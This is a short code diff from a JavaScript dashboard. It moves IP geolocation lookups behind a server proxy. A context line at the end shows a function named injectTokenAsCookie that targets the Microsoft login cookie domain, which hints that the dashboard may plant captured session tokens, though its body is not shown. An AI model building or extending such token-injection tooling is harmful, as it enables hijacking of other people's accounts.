@@ -403,9 +403,25 @@
         return String.fromCodePoint(0x1F1E6 + countryCode.charCodeAt(0) - 65, 0x1F1E6 + countryCode.charCodeAt(1) - 65);
     }
 
+    // 🔥 FIXED: Fetch via server proxy (no CORS issues)
     async function getIPLocation(ip) {
-        try { const res = await fetch(`https://ipapi.co/${ip}/json/`); const data = await res.json(); if (data.latitude && data.longitude) return { lat: data.latitude, lon: data.longitude, country: data.country_name, city: data.city, countryCode: data.country_code }; } catch (e) {}
-        return null;
+        try {
+            const res = await fetch(`/dash/api/ip/${ip}`);
+            if (!res.ok) return null;
+            const data = await res.json();
+            if (data.latitude && data.longitude) {
+                return {
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    country: data.country_name,
+                    city: data.city,
+                    countryCode: data.country_code
+                };
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
     }
 
     function injectTokenAsCookie(token, domain = '.login.microsoftonline.com') {
